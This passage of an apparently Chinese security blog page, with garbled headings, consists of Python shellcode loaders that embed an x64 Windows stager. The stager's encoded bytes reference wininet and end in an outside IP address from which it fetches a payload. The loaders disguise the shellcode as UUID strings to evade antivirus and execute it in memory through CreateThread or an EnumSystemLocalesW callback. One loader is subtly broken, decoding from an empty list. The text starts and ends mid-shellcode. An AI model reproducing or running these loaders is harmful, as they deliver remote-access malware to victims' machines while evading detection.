class="string">&#x27;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x60\x11\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x74\x43\x43\x63\x00\x6f\xc7\xb5\xfb\x90\x23\x05\x5e\xfe\xbf\x26\xa1\x46\x4b\x36\x28\xe6\xd1\xab\x1f\xc4\x12\x9a\x19\x5f\x81\x42\x52\xef\x4b\xc3\x7c\xcf\x23\xea\x51\x00\x2e\xb8\xfa\xd5\xc5\xe6\xde\x0f\xe3\x56\x5f\xc9\x36\x70\x95\x75\x17\x6f\x16\x05\x5f\x43\xd2\xcb\x8d\x72\x59\xb3\xe1\x8f\x1a\x3d\x94\xc1\x6a\xa8\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x38\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x35\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x34\x2e\x30\x29\x0d\x0a\x00\x84\xfd\x1c\x74\xe3\xda\x9f\x6c\x3b\xf3\x5d\x2e\xfe\x41\x0e\x49\x8c\x4e\x85\x5a\x10\x24\xf9\x19\xb5\xbe\x48\xf3\xfe\xc2\x20\xa8\x49\xdd\xd7\xd8\x35\xd5\x1a\x02\x8d\xaa\xbd\xfa\x56\x1e\x89\x8e\x99\x12\xfc\x51\x96\x2d\xc7\x90\x1f\x3c\xc8\x14\xdb\x9a\x62\xf2\x40\x4f\x7a\x63\x86\x08\x2a\xec\x86\x82\x55\xef\xb8\x18\x88\x69\xe6\x9f\x6d\xce\x1e\x28\x2e\x16\xb2\xa6\x13\x75\xd2\xa7\x4c\xae\x7a\x58\xea\x5c\x74\xb1\xce\x15\x92\xb4\xd9\x75\x6f\x33\xc1\xe6\x71\x08\x60\x27\x39\x6d\x6c\xfe\xf6\x3a\xda\x6d\x66\x72\xc6\x01\x9a\xb5\x40\x4d\xa0\xce\xe8\xa5\x6f\x01\x54\x9c\xe3\x1f\x36\x78\xd8\x71\xc6\x7f\x36\x8f\x06\xf8\xed\xc2\x53\xcc\x78\xe6\x34\xb8\x9c\xe9\xeb\x47\xc7\xaf\x08\xbb\x46\xdc\x00\xdd\x20\x59\xa7\xab\xbc\x68\x1e\xbe\x43\xd5\x37\x39\x09\x25\x27\xb3\xaa\x06\x25\x5d\x51\x12\xf5\xc7\xfc\xb0\xa2\xec\x0d\xa3\x63\xcd\x9f\xc4\x16\x01\x5d\x8d\x5e\x3f\x60\x86\xf1\x15\x7a\x11\x39\xf3\x1b\xae\xa0\x13\xb7\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x34\x33\x2e\x31\x33\x38\x2e\x32\x37\x2e\x31\x32\x00\x49\x96\x02\xd2&#x27;</span></span><br><span class="line">uuid_list = []</span><br><span class="line"><span class="built_in">hex</span> = binascii.hexlify(buf).decode()</span><br><span class="line"></span><br><span class="line"><span class="built_in">hex</span> += <span class="string">&#x27;0&#x27;</span> * (<span class="number">32</span> - (<span class="built_in">len</span>(<span class="built_in">hex</span>) % <span class="number">32</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(<span class="built_in">hex</span>),<span class="number">32</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\&quot;&#123;&#125;\&quot;,&quot;</span>.<span class="built_in">format</span>(uuid.UUID(bytes_le=binascii.unhexlify(<span class="built_in">hex</span>[i:i+<span class="number">32</span>]))))</span><br></pre></td></tr></table></figure><h4 id="python2-uuidåŠ è½½å™¨"><a href="#python2-uuidåŠ è½½å™¨" class="headerlink" title="python2 uuidåŠ è½½å™¨"></a>python2 uuidåŠ è½½å™¨</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x60\x11\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x31\x73\x68\x51\x00\x27\x6b\x08\x03\x3f\x21\xf1\xec\xd6\xc0\x3b\xae\xe3\xab\x55\x82\xf4\x40\xbc\x5b\x9f\xfa\x45\xbd\x37\x51\x3b\xe0\x0d\xa4\x3b\xb2\xd1\xf9\x74\xda\x3a\xd8\x44\xb1\x60\x84\xc5\x83\x10\x70\x5e\x54\x63\xc7\xf8\xf8\x74\x9b\x2b\x6a\x35\x08\xd5\x11\xa9\x32\x98\xec\xd8\x01\xf0\xc4\xae\x4b\x4b\x6c\xba\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x36\x2e\x30\x3b\x20\x4d\x41\x53\x50\x29\x0d\x0a\x00\x36\x33\x5a\x21\x1c\xe3\x65\x2d\x0e\x19\xa1\xd3\x4c\xf9\x56\xc3\x4e\x54\x7e\x1c\x21\x38\x30\xf3\xf7\x7f\x4a\x21\x52\xb8\x55\x9f\xd0\x0f\x25\x99\x79\x4a\x2b\xcc\xd7\x09\x95\x74\x3b\xee\x1c\xfa\xad\xbd\xec\x84\x00\xdb\xd8\x58\x89\xb8\xad\xd3\x86\x5b\xd3\x09\xc2\xcd\xb6\xfd\x9e\x9f\xb2\x26\xc8\xaa\xfc\x0e\xc9\xf8\xa2\xfd\x5c\x99\x91\xb7\x08\x11\xd8\x91\xde\xfe\x43\x95\x1c\x96\x29\x08\x55\x39\x21\x7d\x8c\xd5\xac\x46\x6e\x78\x65\x16\xb9\xf1\x53\xc6\x25\x76\x78\xd7\xfd\xdd\xb0\x7f\x40\xea\x7f\x68\xba\x6e\x5d\x99\x55\x5f\x11\xd9\x05\x90\x92\x2c\x9e\xb3\x75\x5e\x73\x72\x81\x4d\xe0\x00\xa6\x38\x0b\xed\xe5\x4e\xcb\x8d\xd1\x44\x12\xb3\xf8\xd0\x3a\xcc\xd6\x06\xf1\x36\x4f\x8e\x66\x39\x66\x42\xe3\xc7\x74\xa5\xbd\xac\x0d\xe6\xe5\xd3\x53\x0c\x8e\x90\xca\xd3\x01\x0d\x88\x7c\x91\x63\xdb\xe2\xd9\xb3\x4d\x9f\x57\x3b\x64\x31\x8a\x66\xea\x78\xeb\x07\x09\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x34\x33\x2e\x31\x33\x38\x2e\x32\x37\x2e\x31\x32\x00\x49\x96\x02\xd2&quot;</span></span><br><span class="line"><span class="built_in">list</span> = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    bytes_a = shellcode[i * <span class="number">16</span>: <span class="number">16</span> + i * <span class="number">16</span>]</span><br><span class="line">    b = uuid.UUID(bytes_le=bytes_a)</span><br><span class="line">    <span class="built_in">list</span>.append(<span class="built_in">str</span>(b))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(uuid_list)*<span class="number">16</span>), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"></span><br><span class="line">ptr1 = ptr</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> uuid_list:</span><br><span class="line">    ctypes.windll.Rpcrt4.UuidFromStringA(j, ptr1)</span><br><span class="line">    ptr1 += <span class="number">16</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, ptr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">shellcode=<span class="string">b&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x60\x11\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x31\x73\x68\x51\x00\x27\x6b\x08\x03\x3f\x21\xf1\xec\xd6\xc0\x3b\xae\xe3\xab\x55\x82\xf4\x40\xbc\x5b\x9f\xfa\x45\xbd\x37\x51\x3b\xe0\x0d\xa4\x3b\xb2\xd1\xf9\x74\xda\x3a\xd8\x44\xb1\x60\x84\xc5\x83\x10\x70\x5e\x54\x63\xc7\xf8\xf8\x74\x9b\x2b\x6a\x35\x08\xd5\x11\xa9\x32\x98\xec\xd8\x01\xf0\xc4\xae\x4b\x4b\x6c\xba\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x36\x2e\x30\x3b\x20\x4d\x41\x53\x50\x29\x0d\x0a\x00\x36\x33\x5a\x21\x1c\xe3\x65\x2d\x0e\x19\xa1\xd3\x4c\xf9\x56\xc3\x4e\x54\x7e\x1c\x21\x38\x30\xf3\xf7\x7f\x4a\x21\x52\xb8\x55\x9f\xd0\x0f\x25\x99\x79\x4a\x2b\xcc\xd7\x09\x95\x74\x3b\xee\x1c\xfa\xad\xbd\xec\x84\x00\xdb\xd8\x58\x89\xb8\xad\xd3\x86\x5b\xd3\x09\xc2\xcd\xb6\xfd\x9e\x9f\xb2\x26\xc8\xaa\xfc\x0e\xc9\xf8\xa2\xfd\x5c\x99\x91\xb7\x08\x11\xd8\x91\xde\xfe\x43\x95\x1c\x96\x29\x08\x55\x39\x21\x7d\x8c\xd5\xac\x46\x6e\x78\x65\x16\xb9\xf1\x53\xc6\x25\x76\x78\xd7\xfd\xdd\xb0\x7f\x40\xea\x7f\x68\xba\x6e\x5d\x99\x55\x5f\x11\xd9\x05\x90\x92\x2c\x9e\xb3\x75\x5e\x73\x72\x81\x4d\xe0\x00\xa6\x38\x0b\xed\xe5\x4e\xcb\x8d\xd1\x44\x12\xb3\xf8\xd0\x3a\xcc\xd6\x06\xf1\x36\x4f\x8e\x66\x39\x66\x42\xe3\xc7\x74\xa5\xbd\xac\x0d\xe6\xe5\xd3\x53\x0c\x8e\x90\xca\xd3\x01\x0d\x88\x7c\x91\x63\xdb\xe2\xd9\xb3\x4d\x9f\x57\x3b\x64\x31\x8a\x66\xea\x78\xeb\x07\x09\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x34\x33\x2e\x31\x33\x38\x2e\x32\x37\x2e\x31\x32\x00\x49\x96\x02\xd2&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">UUIDConvert</span>(<span class="params">shellcode</span>):</span><br><span class="line">    uuid_shellcode = []</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(shellcode) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        null_byte = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">16</span> - <span class="built_in">len</span>(shellcode) % <span class="number">16</span>)</span><br><span class="line">        shellcode += null_byte</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">16</span>):</span><br><span class="line">        uuid_string = <span class="built_in">str</span>(uuid.UUID(bytes_le=shellcode[i: i + <span class="number">16</span>]))</span><br><span class="line">        uuid_shellcode.append(uuid_string)</span><br><span class="line">    <span class="keyword">return</span> uuid_shellcode</span><br><span class="line"></span><br><span class="line">uuid_shellcode = UUIDConvert(shellcode=shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctypes.windll.Activeds.AllocADsMem.restype = ctypes.c_uint64</span><br><span class="line">ptr_alloc = ctypes.windll.Activeds.AllocADsMem(ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">ptr_realloc = ctypes.windll.Activeds.ReallocADsMem(ptr_alloc, <span class="built_in">len</span>(shellcode), <span class="built_in">len</span>(shellcode))</span><br><span class="line">ctypes.windll.kernel32.VirtualProtect(ptr_realloc, ctypes.c_int(<span class="built_in">len</span>(shellcode)), <span class="number">0x40</span>, ctypes.byref(ctypes.c_long(<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line">ptr = ptr_realloc</span><br><span class="line"><span class="keyword">for</span> code <span class="keyword">in</span> uuid_shellcode:</span><br><span class="line">    ctypes.windll.Rpcrt4.UuidFromStringA(code, ptr)</span><br><span class="line">    ptr += <span class="number">16</span></span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.EnumSystemLocalesW(ptr_realloc, <span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="python-macå†…å­˜åŠ è½½"><a href="#python-macå†…å­˜åŠ è½½" class="headerlink" title="python macå†…å­˜åŠ è½½"></a>python macå†…å­˜åŠ è½½</h4><p><a href="https://blog.csdn.net/luochen2436/article/details/124035788">https://blog.csdn.net/luochen2436/article/details/124035788</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">shellcode=<span class="string">b&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x60\x11\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x31\x73\x68\x51\x00\x27\x6b\x08\x03\x3f\x21\xf1\xec\xd6\xc0\x3b\xae\xe3\xab\x55\x82\xf4\x40\xbc\x5b\x9f\xfa\x45\xbd\x37\x51\x3b\xe0\x0d\xa4\x3b\xb2\xd1\xf9\x74\xda\x3a\xd8\x44\xb1\x60\x84\xc5\x83\x10\x70\x5e\x54\x63\xc7\xf8\xf8\x74\x9b\x2b\x6a\x35\x08\xd5\x11\xa9\x32\x98\xec\xd8\x01\xf0\xc4\xae\x4b\x4b\x6c\xba\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x36\x2e\x30\x3b\x20\x4d\x41\x53\x50\x29\x0d\x0a\x00\x36\x33\x5a\x21\x1c\xe3\x65\x2d\x0e\x19\xa1\xd3\x4c\xf9\x56\xc3\x4e\x54\x7e\x1c\x21\x38\x30\xf3\xf7\x7f\x4a\x21\x52\xb8\x55\x9f\xd0\x0f\x25\x99\x79\x4a\x2b\xcc\xd7\x09\x95\x74\x3b\xee\x1c\xfa\xad\xbd\xec\x84\x00\xdb\xd8\x58\x89